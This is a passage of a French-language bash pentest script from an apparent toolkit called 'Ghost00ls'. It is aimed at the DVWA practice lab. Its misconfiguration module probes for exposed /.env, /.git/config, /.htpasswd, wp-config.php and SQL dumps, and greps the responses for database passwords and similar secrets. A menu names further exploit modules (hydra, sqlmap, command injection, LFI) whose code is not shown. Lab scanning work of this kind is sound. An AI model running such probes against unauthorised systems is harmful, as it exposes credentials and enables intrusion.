    echo "‚Ä¢ Rapport HTML : $HTML"
    echo "‚Ä¢ CSV : $CSV"
    echo "‚úÖ Scan termin√©."
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################


exploit_misconfig() {
    clear
    banner "MISCONFIG"
    echo "=================================================="
    echo "üß™ [Security Misconfiguration - exploit_misconfig]"
    echo "üìñ Objectif : d√©tecter mauvaises configurations serveur / appli"
    echo "‚ö†Ô∏è  √Ä utiliser uniquement sur des cibles autoris√©es"
    echo "=================================================="

    # === Variables ===
    local TARGET_IP TARGET_PORT TARGET_PATH TARGET_URL COOKIE TIMEOUT STREAMING USE_FFUF FFUF_THREADS
    local LOGDIR WORKDIR CSV REPORT_HTML HEADERS_FILE UA BL_META BL_STATUS BL_SIZE BL_TIME
    local -a CHECK_PATHS HEADERS_TO_CHECK

    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " TARGET_IP
    TARGET_IP=${TARGET_IP:-192.168.20.101}
    read -p "üîå Port (default: 8081): " TARGET_PORT
    TARGET_PORT=${TARGET_PORT:-8081}
    read -p "üìÅ Path de base (default: /): " TARGET_PATH
    TARGET_PATH=${TARGET_PATH:-/}
    read -p "üç™ Cookie header (ex: PHPSESSID=xxx - laisser vide pour none): " COOKIE
    read -p "‚è± Timeout par requ√™te (default: 10): " TIMEOUT
    TIMEOUT=${TIMEOUT:-10}
    read -p "‚ñ∂ Mode streaming (afficher r√©sultats live) ? [Y/n]: " STREAMING
    STREAMING=${STREAMING:-Y}
    read -p "‚ñ∂ Utiliser ffuf pour discovery (si install√©) ? [y/N]: " USE_FFUF
    USE_FFUF=${USE_FFUF:-N}
    if [[ "${USE_FFUF^^}" == "Y" ]]; then
        read -p "‚öôÔ∏è Threads ffuf (default: 20): " FFUF_THREADS
        FFUF_THREADS=${FFUF_THREADS:-20}
    fi

    TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}${TARGET_PATH}"
    WORKDIR="$(mktemp -d /tmp/ghost_misconfig_XXXX)"
    LOGDIR="$HOME/ghost00ls/logs/dvwa_exploits/misconfig/$(date +%F_%H-%M-%S)"
    mkdir -p "$LOGDIR"
    CSV="$LOGDIR/misconfig_summary.csv"
    REPORT_HTML="$LOGDIR/misconfig_report.html"
    HEADERS_FILE="$WORKDIR/headers_http.txt"
    UA="Ghost00ls-Misconfig/1.0"

    echo
    echo "üåê Cible : $TARGET_URL"
    echo "üìÅ Logs : $LOGDIR"
    echo "‚ñ∂ Working dir : $WORKDIR"
    echo

    # === Items to check ===
    CHECK_PATHS=(
        "/robots.txt"
        "/sitemap.xml"
        "/phpinfo.php"
        "/.env"
        "/.git/config"
        "/.git/"
        "/.svn/entries"
        "/.htaccess"
        "/.htpasswd"
        "/server-status"
        "/uploads/"
        "/backup/"
        "/db.sql"
        "/dump.sql"
        "/config.php"
        "/wp-config.php"
        "/admin/"
        "/setup/"
        "/test/"
        "/logs/"
    )

    HEADERS_TO_CHECK=( "X-Frame-Options" "X-Content-Type-Options" "Strict-Transport-Security" "Content-Security-Policy" "Referrer-Policy" )

    # === Helper: perform curl (GET) and save body optionally ===
    _curl_get() {
        # args: url out_file
        local url="$1"
        local out="$2"
        if [ -n "$COOKIE" ]; then
            curl -sS -m "$TIMEOUT" -A "$UA" -H "Cookie: $COOKIE" -L -k -o "$out" -w "%{http_code}|%{size_download}|%{time_total}" "$url" 2>/dev/null
        else
            curl -sS -m "$TIMEOUT" -A "$UA" -L -k -o "$out" -w "%{http_code}|%{size_download}|%{time_total}" "$url" 2>/dev/null
        fi
    }

    # === Grab headers from root (HEAD request) ===
    if [ -n "$COOKIE" ]; then
        curl -sS -m "$TIMEOUT" -A "$UA" -H "Cookie: $COOKIE" -I -L -k "$TARGET_URL" > "$HEADERS_FILE" 2>/dev/null || true
    else
        curl -sS -m "$TIMEOUT" -A "$UA" -I -L -k "$TARGET_URL" > "$HEADERS_FILE" 2>/dev/null || true
    fi

    echo "‚ñ∂ Analyse des headers HTTP..."
    local SERVER_FINGERPRINT
    SERVER_FINGERPRINT=$(grep -i '^Server:' "$HEADERS_FILE" 2>/dev/null | tr -d '\r' || true)
    local XPOWEREDBY
    XPOWEREDBY=$(grep -i '^X-Powered-By:' "$HEADERS_FILE" 2>/dev/null | tr -d '\r' || true)

    echo "üß† Fingerprint serveur : ${SERVER_FINGERPRINT:-N/A}"
    if [ -n "$XPOWEREDBY" ]; then
        echo "‚öôÔ∏è  $XPOWEREDBY"
    fi

    # Check missing security headers
    local missing_headers=()
    for h in "${HEADERS_TO_CHECK[@]}"; do
        if ! grep -i "^${h}:" "$HEADERS_FILE" >/dev/null 2>&1; then
            missing_headers+=("$h")
        fi
    done
    if [ ${#missing_headers[@]} -gt 0 ]; then
        echo "‚ö†Ô∏è  Headers manquants : ${missing_headers[*]}"
    else
        echo "‚úÖ Headers de s√©curit√© pr√©sents"
    fi

    # === Baseline (root GET) ===
    echo
    echo "‚ñ∂ Mesure baseline (GET racine)..."
    BL_META=$(_curl_get "$TARGET_URL" "$WORKDIR/root.html")
    BL_STATUS=$(echo "$BL_META" | cut -d'|' -f1)
    BL_SIZE=$(echo "$BL_META" | cut -d'|' -f2)
    BL_TIME=$(echo "$BL_META" | cut -d'|' -f3)
    echo "Baseline -> status:${BL_STATUS:-000} size:${BL_SIZE:-0} time:${BL_TIME:-0}"

    # === Prepare CSV ===
    echo "path,status,size,time,note" > "$CSV"

    # === Check each path ===
    echo
    echo "‚ñ∂ Recherche de fichiers / r√©pertoires expos√©s..."
    for p in "${CHECK_PATHS[@]}"; do
        local url="${TARGET_URL%/}${p}"
        local safe_name
        safe_name=$(echo "$p" | sed 's/[^A-Za-z0-9]/_/g')
        local out="$WORKDIR/out_${safe_name}.html"
        local meta
        meta=$(_curl_get "$url" "$out")
        local status=$(echo "$meta" | cut -d'|' -f1)
        local size=$(echo "$meta" | cut -d'|' -f2)
        local time_req=$(echo "$meta" | cut -d'|' -f3)
        local note=""

        if [ "$status" = "200" ]; then
            if [ "$size" -eq 0 ] || [ "$size" -ne "$BL_SIZE" ]; then
                note="file-accessible"
            else
                note="200-similar"
            fi
        elif [ "$status" = "403" ]; then
            note="forbidden"
        fi

        if [ "$status" = "200" ]; then
            if grep -qi "phpinfo" "$out" 2>/dev/null; then
                note="${note:+$note,}phpinfo"
            fi
            if grep -Eq "DB_NAME|DB_USER|DB_PASSWORD|wp_" "$out" 2>/dev/null; then
                note="${note:+$note,}possible-secrets"
            fi
            if grep -qi "Repository configuration file" "$out" 2>/dev/null || grep -qi "git" "$out" 2>/dev/null; then
                note="${note:+$note,}.git-exposed"
            fi
        fi

        if [[ "${STREAMING^^}" == "Y" ]]; then
            if [ "$status" = "200" ]; then
                echo "‚ö†Ô∏è  [Accessible] ‚Üí $url ($status | ${size}B)"
            elif [ "$status" = "403" ]; then
                echo "‚ö†Ô∏è  [Forbidden (exists)] ‚Üí $url ($status | ${size}B)"
            else
                echo "‚ùå [MISS] ‚Üí $url ($status)"
            fi
        fi

        printf '%s,%s,%s,%s,%s\n' "$p" "${status:-000}" "${size:-0}" "${time_req:-0}" "${note}" >> "$CSV"
    done

    # === Optional ffuf discovery (if asked and installed) ===
    if [[ "${USE_FFUF^^}" == "Y" ]] && command -v ffuf >/dev/null 2>&1; then
        echo
        echo "‚ñ∂ ffuf trouv√© ‚Äî ex√©cution (auto mode) avec ${FFUF_THREADS:-20} threads..."
        local FFUF_OUT="$WORKDIR/ffuf_raw.csv"
        local FF_WL="$HOME/ghost00ls/wordlists/common_web_paths.txt"
        if [ ! -f "$FF_WL" ]; then
            FF_WL="$WORKDIR/ffuf_tmp_wl.txt"
            cat > "$FF_WL" <<'WL'
admin
backup
config
.git
phpinfo.php
uploads
robots.txt
sitemap.xml
WL
        fi
        ffuf -u "${TARGET_URL%/}/FUZZ" -w "$FF_WL" -t "${FFUF_THREADS:-20}" -mc all -o "$FFUF_OUT" -of csv >/dev/null 2>&1 || true
        if [ -f "$FFUF_OUT" ]; then
            tail -n +2 "$FFUF_OUT" | awk -F',' '{print $2","$3","$4",ffuf"}' >> "$CSV" 2>/dev/null || true
            echo "‚úÖ R√©sultats ffuf fusionn√©s dans le CSV final ($FFUF_OUT)"
        fi
    fi

    # === HTML report ===
    echo
    echo "‚ñ∂ G√©n√©ration du rapport HTML..."
    {
        echo "<!doctype html><html><head><meta charset='utf-8'><title>Ghost00ls - Misconfig Report</title>"
        echo "<style>body{font-family:monospace;background:#111;color:#ddd;padding:12px}table{border-collapse:collapse;width:100%}th,td{border:1px solid #333;padding:6px}th{background:#222}</style></head><body>"
        echo "<h2>Ghost00ls - Security Misconfiguration Report</h2>"
        echo "<p>Target: ${TARGET_URL}</p><p>Date: $(date)</p>"
        echo "<h3>Server fingerprint</h3><pre>$(sed 's/</&lt;/g' "$HEADERS_FILE" 2>/dev/null)</pre>"
        echo "<h3>Summary</h3>"
        echo "<table><tr><th>Path</th><th>Status</th><th>Size</th><th>Time</th><th>Note</th></tr>"
        tail -n +2 "$CSV" | while IFS=',' read -r path status size time note; do
            echo "<tr><td>${path}</td><td>${status}</td><td>${size}</td><td>${time}</td><td>${note}</td></tr>"
        done
        echo "</table>"
        echo "<p>CSV: $(basename "$CSV")</p>"
        echo "</body></html>"
    } > "$REPORT_HTML"

    echo
    echo "üìä R√©sum√© Misconfig :"
    echo "‚Ä¢ Rapport HTML : $REPORT_HTML"
    echo "‚Ä¢ CSV : $CSV"
    echo "‚Ä¢ Workdir : $WORKDIR"
    echo "‚úÖ Scan termin√©."
    echo
    echo "‚ñ∂ Pour supprimer le WORKDIR ex√©cute : rm -rf '$WORKDIR'"
    read -p "üëâ Entr√©e pour revenir..."
}



###################################################################################################



###################################################################################################

# === Menu ===
menu_exploits() {
    clear; banner
    echo -e "${CYAN}=== üí£ Exemples d‚Äôexploitation DVWA (Ghost00ls) ===${NC}"
    echo "1) Hydra Brute Force"
    echo "2) SQL Injection (sqlmap)"
    echo "3) Directory Bruteforce (dirb/gobuster)"
    echo "4) Fuzzing (wfuzz)"
    echo "5) XSS"
    echo "6) Command Injection"
    echo "7) File Upload"
    echo "8) File Inclusion (LFI/RFI)"
    echo "9) CSRF"
    echo "10) Broken Auth"
    echo "11) IDOR"
    echo "12) Security Misconfiguration"
    echo "0) Quit"
    echo
    read -p "üëâ Choix : " choice

    case $choice in
        1) exploit_hydra ;;
        2) exploit_sqlmap ;;
        3) exploit_dirb ;; 
        4) exploit_wfuzz ;;
        5) exploit_xss ;;
        6) exploit_cmdinj ;;
        7) exploit_upload ;;
        8) exploit_lfi ;;
        9) exploit_csrf ;;
        10) exploit_auth ;;
        11) exploit_idor ;;
        12) exploit_misconfig ;;
        0) exit 0 ;;
        *) echo -e "${RED}‚ùå Option invalide${NC}" ;;
    esac
    menu_exploits
}

menu_exploits
